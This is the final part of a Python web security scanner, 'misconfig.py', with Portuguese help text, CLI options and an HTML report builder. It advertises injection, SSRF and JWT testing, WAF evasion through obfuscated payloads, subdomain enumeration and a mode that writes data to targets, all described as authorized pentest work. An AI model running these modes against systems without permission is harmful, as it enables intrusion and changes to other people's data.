        if f.curl:
            curl = (f'<div class="curlrow"><b>Validar:</b> <code>{e(f.curl)}</code>'
                    f'<button class="copy" onclick="cp(this)">copiar</button></div>')
        rows.append(
            f'<div class="card" data-sev="{f.severity}" data-txt="{e((f.title+" "+f.url+" "+f.detail).lower())}">'
            f'<div class="chead"><span class="sev" style="background:{color}">{sev_pt}</span>'
            f'<span class="cat">{e(CAT_PT.get(f.category, f.category))}</span>{conf_html}'
            f'<span class="num">#{i:02d}</span></div>'
            f'<div class="title">{e(f.title)}</div>{url_html}{detail}{evid}{curl}</div>')

    meta_txt = (f"{meta.get('requests','?')} requisicoes | {meta.get('elapsed_seconds','?')}s | "
                f"{meta.get('targets','?')} alvo(s)")
    doc = f"""<!doctype html><html lang="pt-br"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>misconfig.py - relatorio</title><style>
:root{{color-scheme:light dark}}
*{{box-sizing:border-box}}
body{{font-family:system-ui,Segoe UI,Roboto,sans-serif;margin:0;background:#0f1115;color:#e6e6e6}}
header{{padding:20px 24px;background:#161a22;border-bottom:1px solid #2a2f3a}}
h1{{margin:0 0 6px;font-size:20px}}
.sub{{color:#9aa4b2;font-size:13px}}
.badge{{display:inline-block;color:#fff;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;margin:8px 6px 0 0}}
.toolbar{{padding:12px 24px;background:#12151c;position:sticky;top:0;z-index:5;border-bottom:1px solid #2a2f3a;display:flex;gap:8px;flex-wrap:wrap;align-items:center}}
.fbtn{{background:#232838;color:#cbd3e1;border:1px solid #333c4f;border-radius:6px;padding:5px 12px;cursor:pointer;font-size:13px}}
.fbtn.active{{background:#3457d5;color:#fff;border-color:#3457d5}}
#q{{flex:1;min-width:180px;background:#1b202b;border:1px solid #333c4f;border-radius:6px;color:#e6e6e6;padding:6px 10px;font-size:13px}}
main{{padding:16px 24px;max-width:1100px;margin:0 auto}}
.card{{background:#161a22;border:1px solid #262b36;border-left:4px solid #444;border-radius:8px;padding:12px 14px;margin:10px 0}}
.chead{{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:4px}}
.sev{{color:#fff;font-weight:700;font-size:11px;padding:2px 8px;border-radius:4px}}
.cat{{color:#9aa4b2;font-size:12px}}
.conf{{color:#fb8c00;font-size:12px;border:1px solid #5a3d13;border-radius:4px;padding:1px 6px}}
.num{{margin-left:auto;color:#5c6470;font-size:12px}}
.title{{font-weight:600;margin:2px 0}}
.url{{font-family:ui-monospace,Consolas,monospace;font-size:13px;color:#7fd1e0;word-break:break-all}}
.meth{{color:#e0b341;font-weight:700}}
.detail{{color:#c3cad6;font-size:13px;margin-top:3px}}
.evid{{color:#9aa4b2;font-size:12px;margin-top:3px;word-break:break-all}}
.curlrow{{margin-top:6px;font-size:12px;color:#9aa4b2}}
code{{background:#0b0d11;color:#8fe388;padding:4px 8px;border-radius:4px;font-family:ui-monospace,Consolas,monospace;font-size:12px;word-break:break-all;display:inline-block;max-width:100%}}
.copy{{background:#232838;border:1px solid #333c4f;color:#cbd3e1;border-radius:4px;padding:2px 8px;cursor:pointer;font-size:11px;margin-left:6px}}
.dim{{color:#5c6470}}
.hidden{{display:none}}
footer{{padding:16px 24px;color:#5c6470;font-size:12px;text-align:center}}
</style></head><body>
<header><h1>misconfig.py &mdash; relatorio de seguranca</h1>
<div class="sub">Gerado em {gen} &middot; {e(meta_txt)}</div>
<div>{badges}</div></header>
<div class="toolbar">{btns}<input id="q" placeholder="buscar (titulo, URL, detalhe)..."></div>
<main>{''.join(rows) if rows else '<p>Nenhum achado.</p>'}</main>
<footer>misconfig.py &middot; use apenas em alvos autorizados</footer>
<script>
const cards=[...document.querySelectorAll('.card')];let sev='all',q='';
function apply(){{cards.forEach(c=>{{const ok=(sev==='all'||c.dataset.sev===sev)&&(q===''||c.dataset.txt.includes(q));c.classList.toggle('hidden',!ok)}})}}
document.querySelectorAll('.fbtn').forEach(b=>b.onclick=()=>{{document.querySelectorAll('.fbtn').forEach(x=>x.classList.remove('active'));b.classList.add('active');sev=b.dataset.sev;apply()}});
document.getElementById('q').oninput=e=>{{q=e.target.value.toLowerCase();apply()}};
function cp(btn){{const c=btn.previousElementSibling.textContent;navigator.clipboard.writeText(c).then(()=>{{btn.textContent='copiado!';setTimeout(()=>btn.textContent='copiar',1200)}})}}
</script></body></html>"""
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(doc)
    p(f"{C.GREEN}[+]{C.RESET} Relatorio HTML salvo em: {_file_url(path)}")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
BANNER = r"""
  _ __ ___ (_)___  ___ ___  _ __  / _(_) __ _
 | '_ ` _ \| / __|/ __/ _ \| '_ \| |_| |/ _` |
 | | | | | | \__ \ (_| (_) | | | |  _| | (_| |
 |_| |_| |_|_|___/\___\___/|_| |_|_| |_|\__, |
   misconfig / sensitive-data / info-disclosure |___/  [AGGRESSIVE]
"""


HELP_DESC = """\
misconfig.py - Scanner agressivo de misconfigurations, dados sensiveis expostos,
divulgacao de informacao, falhas de API, fingerprint de tecnologias/CVEs e recon.

FLUXO DE USO
  -d ALVO         escaneia um unico dominio/URL
  -l ARQUIVO      escaneia varios dominios (um por linha)
  -D DOMINIO      RECON COMPLETO: enumera subdominios -> alive-check ->
                  enumera URLs -> escaneia TODOS os hosts e URLs achados

O QUE A FERRAMENTA PROCURA
  * Dados sensiveis .: .env, .git/.svn, chaves privadas, .htpasswd, dumps SQL,
                       bancos (.sqlite/.db), master.key, tfstate, kubeconfig,
                       + scan de ~62 padroes de segredo (AWS/GCP/GitHub/Stripe...)
  * Cloud ..........: buckets S3/GCS/Azure/DigitalOcean abertos, Firebase RTDB
  * API (OWASP) ....: descoberta + enumeracao de endpoints, Swagger/OpenAPI,
                      BOLA/BFLA, IDOR por IDs, GraphQL (introspection/mutations/
                      batching/CSRF), JWT (alg:none, segredo fraco, bypass de auth),
                      auth bypass (header/path), shadow APIs, CORS por endpoint,
                      excessive data, mass assignment, ausencia de rate limit
  * Info disclosure : stack traces/erros SQL, headers de versao, source maps,
                      segredos/endpoints em JS, comentarios HTML, .well-known
  * Parametros .....: coleta URLs completas (Wayback/sitemap/crawl) com path+query,
                      monta inventario e testa CADA parametro (SQLi erro+blind boolean,
                      XSS refletido, LFI/traversal, open redirect, SSRF/metadata de nuvem)
                      + param mining (params ocultos)
  * Bypass de WAF ..: se um payload (SQLi/XSS/LFI/redirect/SSRF) for BLOQUEADO, tenta
                      variantes encodadas/ofuscadas (URL, double-URL, hex, unicode, HTML
                      entities, mixed-case, whitespace, chained) e reporta qual contornou
  * Misconfig ......: headers de seguranca, CORS, metodos HTTP/TRACE, cookies,
                      directory listing, open redirect, host header injection, TLS
  * Tecnologias/CVE : fingerprint (Server/X-Powered-By/cookies/JS) + CVEs por versao
  * DNS/e-mail .....: subdomain takeover, SPF/DMARC, transferencia de zona (AXFR)

SCAN AUTENTICADO
  -u USUARIO -p SENHA   autentica a sessao antes de escanear. Em modo auto tenta
                        login (form/JSON) em endpoints comuns e, se conseguir um
                        token, usa Bearer; senao cai para HTTP Basic. Use --login-url
                        para apontar o endpoint e --auth-type para forcar o metodo.
  --no-session-cookies  faz requisicoes sem estado (nao reaproveita cookies).

SAIDA
  Relatorio em PT-BR agrupado por alvo, mostrando O QUE foi achado, ONDE (metodo+URL)
  e a CRITICIDADE (CRITICO/ALTO/MEDIO/BAIXO/INFORMATIVO). Use -o para salvar em JSON.
  Codigo de saida 2 quando ha achados CRITICO/ALTO (util para pipeline/CI).
"""

HELP_EPILOG = """\
EXEMPLOS - BASICO
  ./misconfig.py -d exemplo.com -v                    # scan de 1 host, verbose
  ./misconfig.py -d https://alvo.com -vv              # -vv mostra cada requisicao
  ./misconfig.py -l dominios.txt -t 20 -o saida.json  # lista + relatorio JSON

EXEMPLOS - ATIVAR TUDO
  ./misconfig.py -d alvo.com --full -v                # ATIVA TUDO (agressivo+urls+modulos+
                                                      #   destrutivo). CUIDADO: modifica dados!
  ./misconfig.py -D empresa.com --full -o saida.json  # recon completo + tudo ativo

EXEMPLOS - MODO AGRESSIVO (maxima cobertura, nao destrutivo)
  ./misconfig.py -d alvo.com -A -v                    # tudo no maximo (threads/prof/limites)
  ./misconfig.py -D empresa.com -A -o saida.json      # recon completo + scan agressivo
  ./misconfig.py -d alvo.com -A --unsafe-methods      # agressivo + escrita (PUT/PATCH) + mass assign
                                                      #   (NUNCA deleta; registra o que modificou)
                                                      #   (CUIDADO: modifica dados!)

EXEMPLOS - MODO API (foco em OWASP API Top 10)
  ./misconfig.py -d api.alvo.com --api-mode -v        # so testes de API (rapido)
  ./misconfig.py -d api.alvo.com --api-mode -A        # API + agressivo
  ./misconfig.py -d api.alvo.com --api-mode -u admin -p senha  # API autenticado
  ./misconfig.py -d api.alvo.com --login-url /api/v1/login -u a@b.com -p s3nha

EXEMPLOS - RECON / ENUMERACAO
  ./misconfig.py -D empresa.com -v                    # subdominios + URLs + scan
  ./misconfig.py -D empresa.com --subs-only           # so listar subdominios
  ./misconfig.py -d alvo.com --urls -w paths.txt      # host + enum de URLs + wordlist
  ./misconfig.py -D empresa.com --sub-wordlist subs.txt --crawl-depth 3

EXEMPLOS - AUTENTICADO
  ./misconfig.py -d alvo.com -u admin -p senha123     # login automatico (auto)
  ./misconfig.py -d alvo.com -u user@x.com -p s3nha --login-url /api/v1/login
  ./misconfig.py -d alvo.com -u admin -p senha --auth-type basic   # HTTP Basic
  ./misconfig.py -d alvo.com --no-session-cookies     # requisicoes sem estado

EXEMPLOS - SSRF (validacao OUT-OF-BAND por webhook, zero falso positivo)
  ./misconfig.py -d alvo.com --webhook https://webhook.site/SEU-UUID -v
       # SSRF so e reportado se o ALVO realmente bater no seu webhook (callback OOB).
       # Sem --webhook o modulo de SSRF por parametro NAO roda (evita falsos positivos).
  ./misconfig.py -d alvo.com --webhook auto -v      # cria o token do webhook.site sozinho
  ./misconfig.py -D empresa.com -A --webhook https://webhook.site/SEU-UUID
       # OBS: tokens anonimos do webhook.site EXPIRAM; se o seu der erro, use --webhook auto

EXEMPLOS - OUTROS
  ./misconfig.py -d alvo.com --proxy http://127.0.0.1:8080   # via Burp
  ./misconfig.py -d alvo.com --light                         # alvo com WAF/lento (educado)
  ./misconfig.py -d alvo.com -o saida.json --html rel.html   # relatorio JSON + HTML navegavel
  ./misconfig.py -d alvo.com -u admin --ask-password         # senha via prompt (nao vai p/ historico)

AVISO LEGAL
  Use SOMENTE em alvos que voce esta AUTORIZADO a testar (pentest com contrato,
  bug bounty no escopo, laboratorios ou ativos proprios). O trafego e agressivo
  e ruidoso. O uso contra terceiros sem autorizacao pode ser crime.
"""


def parse_args():
    ap = argparse.ArgumentParser(
        prog="misconfig.py",
        description=HELP_DESC,
        epilog=HELP_EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-d", "--domain", help="Dominio ou URL unico (scan direto)")
    g.add_argument("-l", "--list", help="Arquivo com lista de dominios (um por linha)")
    g.add_argument("-D", "--enum", metavar="DOMAIN",
                   help="Enumera subdominios+URLs do DOMINIO e escaneia tudo (recon completo)")

    ap.add_argument("-v", "--verbose", action="count", default=0,
                    help="Detalhe extra: por padrao ja mostra fases+achados; -v mostra cada "
                         "requisicao HTTP; -vv = maximo")
    ap.add_argument("-q", "--quiet", action="store_true",
                    help="Silencioso: mostra apenas o relatorio final (sem progresso ao vivo)")
    ap.add_argument("-A", "--aggressive", action="store_true",
                    help="Modo agressivo: sobe threads/profundidade/limites ao maximo")
    ap.add_argument("--full", "--tudo", dest="full", action="store_true",
                    help="ATIVA TUDO: agressivo + enum de URLs + TODOS os modulos + metodos "
                         "de escrita (PUT/PATCH/mass assignment). NUNCA deleta; registra o que modificou!")
    ap.add_argument("--api-mode", action="store_true",
                    help="Modo API: foca em testes de API (pula backups/cloud/DNS/crawl/arquivos)")
    ap.add_argument("--light", action="store_true",
                    help="Modo leve/educado: menos requisicoes e threads (bom p/ alvos com WAF/lentos)")
    ap.add_argument("--no-adaptive", action="store_true",
                    help="Desligar o backoff automatico ao detectar rate limiting (429/503)")
    ap.add_argument("-t", "--threads", type=int, default=8, help="Alvos simultaneos (default: 8)")
    ap.add_argument("--path-threads", type=int, default=20,
                    help="Threads de probing por alvo (default: 20)")
    ap.add_argument("--timeout", type=float, default=10.0, help="Timeout/req em s (default: 10)")
    ap.add_argument("--retries", type=int, default=1, help="Retries/req (default: 1)")
    ap.add_argument("--delay", type=float, default=0.0, help="Delay entre reqs por thread (s)")
    ap.add_argument("-o", "--output", help="Salvar relatorio JSON")
    ap.add_argument("--html", help="Salvar relatorio HTML navegavel (auto-contido, abre offline)")
    ap.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")
    ap.add_argument("--user-agent", default=DEFAULT_UA, help="User-Agent customizado")
    ap.add_argument("-w", "--wordlist", help="Arquivo com paths extras para fuzzing (um por linha)")
    # --- Autenticacao ---
    aut = ap.add_argument_group("autenticacao (scan autenticado)")
    aut.add_argument("-u", "--user", metavar="USUARIO",
                     help="Usuario ou e-mail para autenticar (login/Basic)")
    aut.add_argument("-p", "--password", metavar="SENHA",
                     help="Senha para autenticar (evite: fica no historico; use --ask-password ou MISCONFIG_PASSWORD)")
    aut.add_argument("--ask-password", action="store_true",
                     help="Perguntar a senha interativamente (nao aparece no historico do shell)")
    aut.add_argument("--login-url", help="URL de login especifica (senao tenta endpoints comuns)")
    aut.add_argument("--auth-type", choices=["auto", "basic", "form", "json"], default="auto",
                     help="Tipo de auth: auto (login+fallback Basic), basic, form, json (default: auto)")
    aut.add_argument("--no-session-cookies", action="store_true",
                     help="Nao guardar cookies entre requisicoes (requisicoes sem estado)")
    # --- SSRF com webhook (validacao por OOB callback) ---
    ssrf_grp = ap.add_argument_group("SSRF (validacao por webhook.site)")
    ssrf_grp.add_argument("--webhook", metavar="URL",
                          help="Ativa SSRF validado por callback OOB. Passe a URL do seu webhook "
                               "(ex: --webhook https://webhook.site/SEU-ID) ou 'auto' p/ criar um "
                               "token automaticamente. So reporta SSRF se o alvo REALMENTE fizer a "
                               "requisicao ao seu webhook (zero falso positivo)")
    ap.add_argument("--verify-tls", action="store_true", help="Validar certificados TLS")
    ap.add_argument("--no-tls", action="store_true", help="Pular checagem de certificado/SAN")
    ap.add_argument("--no-backup", action="store_true", help="Pular fuzzing de backups")
    ap.add_argument("--no-dns", action="store_true",
                    help="Pular recon de DNS (CNAME/SPF/DMARC/AXFR/takeover)")
    ap.add_argument("--no-cloud", action="store_true",
                    help="Pular checagem de buckets S3/GCS/Azure/DO e Firebase")
    ap.add_argument("--no-crawl", action="store_true",
                    help="Pular crawling de assets JS (segredos/sourcemap/endpoints)")
    ap.add_argument("--max-assets", type=int, default=25,
                    help="Max de arquivos JS baixados no crawling (default: 25)")
    # --- Testes de API ---
    apg = ap.add_argument_group("API (OWASP API Top 10)")
    apg.add_argument("--no-api-enum", action="store_true",
                     help="Pular enumeracao ativa de endpoints de API (brute de recursos + BOLA por IDs)")
    apg.add_argument("--no-api-deep", action="store_true",
                     help="Pular testes profundos de API (auth bypass, JWT bypass, shadow, CORS)")
    apg.add_argument("--no-ratelimit", action="store_true",
                     help="Nao testar ausencia de rate limiting (evita rajada em /login)")
    apg.add_argument("--no-fingerprint", action="store_true",
                     help="Nao fazer fingerprint de tecnologias / CVEs")
    apg.add_argument("--unsafe-methods", action="store_true",
                     help="Permitir escrita (PUT/PATCH/POST) e mass assignment. NUNCA deleta; registra recursos modificados.")
    # --- Recon / enumeracao ---
    grp = ap.add_argument_group("enumeracao (recon)")
    grp.add_argument("--urls", action="store_true",
                     help="Com -d/-l: tambem enumerar URLs (Wayback/sitemap/crawl) por host")
    grp.add_argument("--no-urls", action="store_true",
                     help="Com -D: NAO enumerar URLs (so subdominios + scan da raiz)")
    grp.add_argument("--subs-only", action="store_true",
                     help="Com -D: apenas enumerar/listar subdominios (nao escaneia)")
    grp.add_argument("--sub-wordlist", help="Wordlist para brute-force ATIVO de subdominios")
    grp.add_argument("--no-brute", action="store_true", help="Nao fazer brute-force DNS de subdominios")
    grp.add_argument("--no-perms", action="store_true",
                     help="Nao gerar permutacoes ativas de subdominios (altdns-like)")
    grp.add_argument("--max-perms", type=int, default=1500,
                     help="Max de permutacoes de subdominio testadas (default: 1500)")
    grp.add_argument("--no-wayback", action="store_true", help="Nao consultar o Wayback Machine")
    grp.add_argument("--crawl-depth", type=int, default=2,
                     help="Profundidade do spider ativo de URLs (default: 2; 0 desliga)")
    grp.add_argument("--no-active-crawl", action="store_true",
                     help="Nao fazer crawl ativo (spider recursivo) de URLs")
    grp.add_argument("--no-content-brute", action="store_true",
                     help="Nao fazer brute-force ativo de conteudo/diretorios")
    grp.add_argument("--content-wordlist", help="Wordlist para brute-force de conteudo (dirs/arquivos)")
    grp.add_argument("--no-params", action="store_true",
                     help="Nao testar parametros das URLs (SQLi/XSS/LFI/open redirect por parametro)")
    grp.add_argument("--param-mining", action="store_true",
                     help="Descobrir parametros ocultos por reflexao (auto no -A/--full)")
    grp.add_argument("--no-evasion", action="store_true",
                     help="Nao tentar variantes encodadas/ofuscadas quando o WAF bloquear o payload")
    grp.add_argument("--no-alive", action="store_true",
                     help="Com -D: nao filtrar por alive (escaneia todos os subdominios resolvidos)")
    grp.add_argument("--max-urls", type=int, default=300,
                     help="Max de URLs enumeradas por host (default: 300)")
    grp.add_argument("--enum-threads", type=int, default=40,
                     help="Threads para enumeracao/resolucao (default: 40)")
    ap.add_argument("--no-color", action="store_true", help="Desabilitar cores")
    ap.add_argument("--no-banner", action="store_true", help="Nao exibir banner")
    return ap.parse_args()


def load_targets(args):
    if args.domain:
        return [args.domain.strip()]
    if not os.path.isfile(args.list):
        p(f"{C.RED}[-]{C.RESET} Arquivo nao encontrado: {args.list}")
        sys.exit(1)
    targets, seen = [], set()
    with open(args.list, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#") and line not in seen:
                seen.add(line)
                targets.append(line)
    return targets


def main():
    args = parse_args()
    # forca UTF-8 na saida (evita UnicodeEncodeError com locais nao-UTF8 / redirecionamento)
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if args.no_color or not sys.stdout.isatty():
        C.disable()
    if not args.no_banner:
        p(f"{C.CYAN}{BANNER}{C.RESET}")

    # --- Modo FULL: ativa TUDO (agressivo + urls + modulos + destrutivo) ---
    if args.full:
        args.aggressive = True
        args.urls = True
        args.unsafe_methods = True
        # garante que nenhum modulo fique desligado
        for flag in ("no_backup", "no_dns", "no_cloud", "no_crawl", "no_api_enum",
                     "no_api_deep", "no_ratelimit", "no_fingerprint", "no_brute",
                     "no_perms", "no_wayback", "no_active_crawl", "no_content_brute",
                     "no_urls", "no_tls", "api_mode", "no_params"):
            setattr(args, flag, False)
        p(f"{C.RED}{C.BOLD}[!!] MODO FULL: todos os modulos ativos, incluindo ESCRITA "
          f"(PUT/PATCH/mass assignment). DELETE NUNCA e enviado.{C.RESET}")
        p(f"{C.RED}     Escritas sao minimas e REGISTRADAS (secao 'RECURSO MODIFICADO'). "
          f"Use SOMENTE com autorizacao explicita.{C.RESET}")

    # --- Modo agressivo: sobe threads/profundidade/limites ao maximo ---
    if args.aggressive:
        args.path_threads = max(args.path_threads, 40)
        args.enum_threads = max(args.enum_threads, 60)
        args.crawl_depth = max(args.crawl_depth, 3)
        args.max_urls = max(args.max_urls, 800)
        args.max_perms = max(args.max_perms, 3000)
        args.max_assets = max(args.max_assets, 60)
        args.retries = max(args.retries, 2)
        args.param_mining = True
    # --- Modo API: desliga modulos nao relacionados a API ---
    if args.api_mode:
        args.no_backup = True
        args.no_cloud = True
        args.no_dns = True
        args.no_content_brute = True
        args.no_active_crawl = True
        args.no_wayback = True
    # --- Modo leve/educado: reduz volume e concorrencia (alvos com WAF/lentos) ---
    if args.light and not args.aggressive and not args.full:
        args.path_threads = min(args.path_threads, 6)
        args.enum_threads = min(args.enum_threads, 12)
        args.max_urls = min(args.max_urls, 100)
        args.max_perms = min(args.max_perms, 400)
        args.crawl_depth = min(args.crawl_depth, 1)
        args.no_backup = True
        args.no_content_brute = True
        args.no_api_enum = True
        if args.delay == 0.0:
            args.delay = 0.15

    # Resolucao da senha: --ask-password (prompt oculto) > env MISCONFIG_PASSWORD > -p
    if args.ask_password:
        try:
            args.password = getpass.getpass("Senha: ")
        except Exception:
            pass
    elif not args.password and os.environ.get("MISCONFIG_PASSWORD"):
        args.password = os.environ["MISCONFIG_PASSWORD"]

    wordlist_entries = load_wordlist(args.wordlist)

    def _read_words(path, label):
        if not path:
            return None
        if not os.path.isfile(path):
            p(f"{C.YELLOW}[!]{C.RESET} {label} nao encontrada: {path}")
            return None
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            return [l.strip() for l in fh if l.strip() and not l.startswith("#")]

    sub_wordlist = _read_words(args.sub_wordlist, "Sub-wordlist")
    content_wordlist = _read_words(args.content_wordlist, "Content-wordlist")

    enum_urls = (args.enum is not None or args.urls) and not args.no_urls

    # --- SSRF por webhook (validacao OUT-OF-BAND) ---
    webhook_validator = None
    if args.webhook:
        if args.webhook.strip().lower() == "auto":
            # cria um token novo automaticamente no webhook.site
            webhook_validator = WebhookValidator.auto()
            if webhook_validator is None:
                p(f"{C.RED}[-]{C.RESET} --webhook auto: falhei ao criar token no webhook.site "
                  f"(rede/rate-limit). Passe uma URL manualmente.")
                sys.exit(1)
            p(f"{C.GREEN}[+]{C.RESET} Token webhook.site criado automaticamente: "
              f"{C.BOLD}{webhook_validator.base}{C.RESET}")
            p(f"{C.GREY}    (abra essa URL no navegador p/ acompanhar os callbacks ao vivo){C.RESET}")
        else:
            webhook_validator = WebhookValidator(args.webhook)

        if webhook_validator.api_ok:
            alive = webhook_validator.validate()
            if alive:
                p(f"{C.GREEN}[+]{C.RESET} SSRF OOB ativado via webhook.site "
                  f"(token {webhook_validator.uuid[:8]}..., validado). Um achado de SSRF so e "
                  f"criado se o ALVO realmente bater no seu webhook (zero falso positivo).")
            else:
                p(f"{C.RED}[-]{C.RESET} O token {webhook_validator.uuid[:8]}... esta "
                  f"EXPIRADO/inacessivel (webhook.site retornou erro). Tokens anonimos expiram.")
                p(f"{C.YELLOW}    Abra https://webhook.site, copie a URL nova, ou use "
                  f"'--webhook auto' p/ criar um token automaticamente.{C.RESET}")
                sys.exit(1)
        else:
            p(f"{C.YELLOW}[!]{C.RESET} --webhook: coleta automatica so e suportada em "
              f"webhook.site. Vou injetar os callbacks, mas verifique manualmente "
              f"{webhook_validator.base} pelas requisicoes recebidas.")

    # Verbosidade efetiva: por PADRAO ja mostra fases + achados ao vivo (nivel 1);
    # -v adiciona cada requisicao HTTP (nivel 2); -vv = maximo; -q silencia (nivel 0).
    verbose_eff = 0 if args.quiet else args.verbose + 1

    opts = {
        "timeout": args.timeout, "retries": args.retries, "proxy": args.proxy,
        "ua": args.user_agent, "verify_tls": args.verify_tls, "no_tls": args.no_tls,
        "no_backup": args.no_backup, "verbose": verbose_eff,
        "path_threads": args.path_threads, "delay": args.delay,
        "no_dns": args.no_dns, "no_cloud": args.no_cloud,
        "no_crawl": args.no_crawl, "max_assets": args.max_assets,
        "wordlist_entries": wordlist_entries,
        "enum_urls": enum_urls, "no_brute": args.no_brute, "no_wayback": args.no_wayback,
        "sub_wordlist": sub_wordlist, "max_urls": args.max_urls,
        "enum_threads": args.enum_threads,
        "no_perms": args.no_perms, "max_perms": args.max_perms,
        "crawl_depth": args.crawl_depth, "no_active_crawl": args.no_active_crawl,
        "no_content_brute": args.no_content_brute, "content_wordlist": content_wordlist,
        "no_api_deep": args.no_api_deep, "no_ratelimit": args.no_ratelimit,
        "unsafe_methods": args.unsafe_methods, "no_api_enum": args.no_api_enum,
        "no_fingerprint": args.no_fingerprint,
        "user": args.user, "password": args.password, "login_url": args.login_url,
        "auth_type": args.auth_type, "no_session_cookies": args.no_session_cookies,
        "api_mode": args.api_mode,
        "no_params": args.no_params, "param_mining": args.param_mining,
        "adaptive": not args.no_adaptive, "no_evasion": args.no_evasion,
        "webhook_validator": webhook_validator,
    }

    start = time.time()
    bag = FindingBag(opts)

    # --- Fase de recon: enumeracao de subdominios (modo -D) ---
    if args.enum:
        domain = urlparse(args.enum).netloc or args.enum.strip()
        domain = domain.split("/")[0]
        subs = enumerate_subdomains(domain, opts)
        p(f"{C.GREEN}[+]{C.RESET} Total de subdominios unicos: {C.BOLD}{len(subs)}{C.RESET}")
        if not args.no_alive:
            p(f"{C.BLUE}[*]{C.RESET} Verificando quais respondem HTTP(S) (alive-check) ...")
            targets = filter_alive(subs, opts)
            p(f"{C.GREEN}[+]{C.RESET} Subdominios vivos: {C.BOLD}{len(targets)}{C.RESET} de {len(subs)}")
        else:
            targets = subs
        if args.subs_only:
            p(f"\n{C.BOLD}=== SUBDOMINIOS ==={C.RESET}")
            for s in (targets if not args.no_alive else subs):
                p(f"  {s}")
            if args.output:
                with open(args.output, "w", encoding="utf-8") as fh:
                    json.dump({"domain": domain, "subdomains": subs,
                               "alive": targets if not args.no_alive else None}, fh, indent=2)
                p(f"{C.GREEN}[+]{C.RESET} Lista salva em: {args.output}")
            p(f"\n{C.GREEN}[+]{C.RESET} Concluido (subs-only) em {time.time()-start:.1f}s")
            sys.exit(0)
        if not targets:
            p(f"{C.RED}[-]{C.RESET} Nenhum subdominio vivo para escanear.")
            sys.exit(1)
    else:
        targets = load_targets(args)
        if not targets:
            p(f"{C.RED}[-]{C.RESET} Nenhum alvo valido.")
            sys.exit(1)

    dns_status = "on" if (HAVE_DNS and not args.no_dns) else ("off (dnspython ausente)" if not HAVE_DNS else "off")
    verb_label = {0: "silencioso", 1: "fases+achados", 2: "requisicoes"}.get(verbose_eff, "maximo")
    p(f"{C.BLUE}[*]{C.RESET} Escaneando {len(targets)} alvo(s) | threads: {args.threads} | "
      f"path-threads: {args.path_threads} | timeout: {args.timeout}s | saida: {verb_label} | "
      f"dns: {dns_status} | url-enum: {'on' if enum_urls else 'off'} | wordlist: +{len(wordlist_entries)}")
    p(f"{C.YELLOW}[!] Use APENAS em alvos autorizados. Trafego agressivo e ruidoso.{C.RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(scan_target, t, opts, bag): t for t in targets}
        for fut in concurrent.futures.as_completed(futures):
            try:
                fut.result()
            except Exception as e:
                p(f"{C.RED}[-]{C.RESET} Erro ao escanear {futures[fut]}: {e}")

    # --- Fase de coleta dos callbacks SSRF (OOB): so agora criamos os achados de SSRF ---
    if webhook_validator is not None and webhook_validator.pending():
        n_probes = webhook_validator.pending()
        # janela adaptativa: -D/-l com muitos subdominios geram muitos probes -> espera mais
        wait = min(30.0, max(12.0, n_probes * 0.4))
        p(f"{C.BLUE}[*]{C.RESET} Aguardando callbacks SSRF no webhook "
          f"({n_probes} probe(s) injetado(s), ate ~{int(wait)}s)...")
        n = webhook_validator.collect(bag, wait_total=wait)
        if n:
            p(f"{C.MAGENTA}{C.BOLD}[!!]{C.RESET} {n} SSRF CONFIRMADO(S) por callback OOB.")
        else:
            p(f"{C.GREY}[i]{C.RESET} Nenhum callback recebido — nenhum SSRF confirmado "
              f"(bom: sem falso positivo).")

    elapsed = time.time() - start
    all_findings = bag.all()
    all_findings.sort(key=lambda f: (f.target, SEVERITY_ORDER.get(f.severity, 9)))

    print_report(all_findings, opts, elapsed)

    meta = {"targets": len(targets), "elapsed_seconds": round(elapsed, 2),
            "threads": args.threads, "requests": STATS.requests, "errors": STATS.errors}
    if args.output:
        save_json(all_findings, args.output, meta)
    if args.html:
        save_html(all_findings, args.html, meta)

    p(f"{C.GREEN}[+]{C.RESET} Concluido em {elapsed:.1f}s "
      f"({STATS.requests} reqs, {STATS.errors} erros)")

    if any(f.severity in ("CRITICAL", "HIGH") for f in all_findings):
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p(f"\n{C.YELLOW}[!] Interrompido pelo usuario.{C.RESET}")
        sys.exit(130)
